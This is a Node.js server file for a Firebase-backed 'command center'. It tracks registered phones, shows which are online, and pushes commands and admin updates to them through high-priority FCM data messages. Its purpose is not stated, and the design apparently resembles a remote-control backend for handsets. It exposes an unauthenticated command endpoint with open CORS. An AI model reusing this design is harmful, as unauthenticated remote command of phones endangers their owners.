// server.js
import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";
import { firestore, rtdb, fcm } from "./config/db.js";

import adminRoutes from "./routes/adminRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";

const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json());

// ===============================
//  SOCKET.IO SETUP
// ===============================
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

// common cleaner
function clean(id) {
  return id?.toString()?.trim()?.toUpperCase();
}

// ===============================
//  HIGH PRIORITY FCM HELPER
// ===============================
async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) {
    console.log("⚠️ sendFcmHighPriority called with EMPTY token");
    return;
  }

  try {
    const message = {
      token,
      android: {
        priority: "high",
      },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    };

    const response = await fcm.send(message);

    console.log(
      "✅ FCM OK:",
      type,
      "| token len:",
      token.length,
      "| msgId:",
      response
    );
  } catch (err) {
    console.error(
      "❌ FCM ERROR:",
      type,
      "| msg:",
      err.message,
      "| code:",
      err.code
    );
  }
}

// ===============================
//  HELPER: BUILD DEVICES LIST
// ===============================
async function buildDevicesList() {
  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) return [];

  const devRaw = devSnap.val() || {};
  const statusRaw = statusSnap.exists() ? statusSnap.val() : {};

  const devices = Object.entries(devRaw).map(([id, obj]) => {
    const st = statusRaw[id] || {};
    return {
      id,
      ...obj,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.timestamp || null,
    };
  });

  return devices;
}

// ===============================
//  HELPER: REFRESH + BROADCAST LIVE DEVICES
// ===============================
async function refreshDevicesLive(reason = "") {
  try {
    const devices = await buildDevicesList();
    lastDevicesList = devices;

    console.log(
      "📡 devicesLive broadcast",
      reason ? `(${reason})` : "",
      "| count:",
      devices.length
    );

    io.emit("devicesLive", {
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
    console.error("❌ refreshDevicesLive error:", err.message);
  }
}

// ===============================
//  SOCKET CONNECTION HANDLERS
// ===============================
io.on("connection", (socket) => {
  console.log("🔗 Connected:", socket.id);
  let current = null;

  socket.emit("devicesLive", {
    success: true,
    count: lastDevicesList.length,
    data: lastDevicesList,
  });

  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) return;

    deviceSockets.set(id, socket.id);
    current = id;

    console.log("📱 Device Registered (socket):", id);

    io.to(socket.id).emit("deviceRegistered", id);

    await rtdb.ref(`status/${id}`).set({
      connectivity: "Online",
      timestamp: Date.now(),
    });

    io.emit("deviceStatus", { id, connectivity: "Online" });

    refreshDevicesLive(`deviceOnline:${id}`);
  });

  socket.on("disconnect", async () => {
    if (current) {
      deviceSockets.delete(current);

      await rtdb.ref(`status/${current}`).set({
        connectivity: "Offline",
        timestamp: Date.now(),
      });

      io.emit("deviceStatus", {
        id: current,
        connectivity: "Offline",
      });

      refreshDevicesLive(`deviceOffline:${current}`);
    }
  });
});

// ===============================
//  LEGACY SEND COMMAND (OPTIONAL)
// ===============================
app.post("/send-command", async (req, res) => {
  try {
    const { uniqueid, title, message } = req.body;
    const id = clean(uniqueid);

    if (!id) return res.status(400).json({ error: "Invalid uniqueid" });

    await rtdb.ref(`commands/${id}`).set({
      title: title || "Command",
      message: message || "",
      timestamp: Date.now(),
    });

    console.log("📩 Legacy Command sent →", id, message);

    return res.json({ success: true });
  } catch (e) {
    console.error("❌ Legacy /send-command error:", e.message);
    return res.status(500).json({ error: e.message });
  }
});

// ===============================
//  RTDB WATCHERS → FCM TRIGGERS
// ===============================

// ⭐ 1) ADMIN NUMBER / STATUS UPDATE
rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
  if (!snap.exists()) return;

  const adminData = snap.val();
  console.log("🔥 RTDB Admin Updated:", adminData);

  try {
    const allDevicesSnap = await rtdb.ref("registeredDevices").get();

    if (!allDevicesSnap.exists()) {
      console.log("⚠️ No registered devices for admin broadcast");
      return;
    }

    allDevicesSnap.forEach((child) => {
      const deviceId = child.key;
      const dev = child.val();
      const token = dev?.fcmToken;

      if (!token) {
        console.log("⚠️ No token for device in adminUpdate:", deviceId);
        return;
      }

      sendFcmHighPriority(token, "ADMIN_UPDATE", {
        deviceId,
        ...adminData,
      });
    });
  } catch (err) {
    console.error("❌ Admin watcher error:", err.message);
  }
});

// ⭐ Helper: normalize command snapshot value
function extractCommandData(raw) {
  if (raw && raw.action) return raw;

  if (raw && typeof raw === "object") {
    const keys = Object.keys(raw);
    if (!keys.length) return null;
    const lastKey = keys[keys.length - 1];
    return raw[lastKey];
  }

  return null;
}

// ⭐ Common handler for deviceCommands add/change
async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) return;

  const deviceId = snap.key;
  const rawCmd = snap.val();
  const cmdData = extractCommandData(rawCmd);

  console.log("📡 RTDB DeviceCommand Changed RAW:", deviceId, rawCmd);
  console.log("📡 DeviceCommand Normalized:", deviceId, cmdData);

  if (!cmdData) {
    console.log("⚠️ No command data parsed for device:", deviceId);
    return;
  }

  try {
    const devSnap = await rtdb.ref(`registeredDevices/${deviceId}`).get();

    if (!devSnap.exists()) {
      console.log("⚠️ Device not found in registeredDevices:", deviceId);
      return;
    }

    const token = devSnap.val()?.fcmToken;
    if (!token) {
      console.log("⚠️ No FCM token for device:", deviceId);
      return;
    }

    await sendFcmHighPriority(token, "DEVICE_COMMAND", {
      uniqueid: deviceId,
      ...cmdData,
    });
  } catch (err) {
    console.error("❌ DeviceCommand watcher error:", err.message);
  }
}

// ⭐ 2) DEVICE COMMANDS (NEW / UPDATE)
const devCmdRef = rtdb.ref("commandCenter/deviceCommands");
devCmdRef.on("child_added", handleDeviceCommandChange);
devCmdRef.on("child_changed", handleDeviceCommandChange);

// ⭐ 3) LIVE DEVICES WATCHERS
rtdb.ref("registeredDevices").on("value", () => {
  refreshDevicesLive("registeredDevices:value");
});

rtdb.ref("status").on("value", () => {
  refreshDevicesLive("status:value");
});

// ⭐ 4) CHECK ONLINE WATCHER → FCM TO THAT DEVICE
// Path: checkOnline/{uid}
async function handleCheckOnlineChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;          // device uid
  const data = snap.val() || {}; // { available, checkedAt }

  console.log("📡 CheckOnline Updated:", uid, data);

  try {
    // device ka token lao
    const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();

    if (!devSnap.exists()) {
      console.log("⚠️ Device not found in registeredDevices for checkOnline:", uid);
      return;
    }

    const token = devSnap.val()?.fcmToken;
    if (!token) {
      console.log("⚠️ No FCM token for device in checkOnline:", uid);
      return;
    }

    // same data device ko push karo
    await sendFcmHighPriority(token, "CHECK_ONLINE", {
      uniqueid: uid,
      available: data.available || "unknown",
      checkedAt: String(data.checkedAt || ""),
    });
  } catch (err) {
    console.error("❌ checkOnline watcher error:", err.message);
  }
}

const checkOnlineRef = rtdb.ref("checkOnline");
checkOnlineRef.on("child_added", handleCheckOnlineChange);
checkOnlineRef.on("child_changed", handleCheckOnlineChange);

// Initial load once at startup
refreshDevicesLive("initial");


app.use(adminRoutes);
app.use(notificationRoutes);
app.use("/api", checkRoutes);
app.use(commandRoutes);

app.get("/", (_, res) => {
  res.send(" RTDB + Socket.IO Backend Running");
});

server.listen(PORT, () => {
  console.log(` Server running on PORT ${PORT}`);
});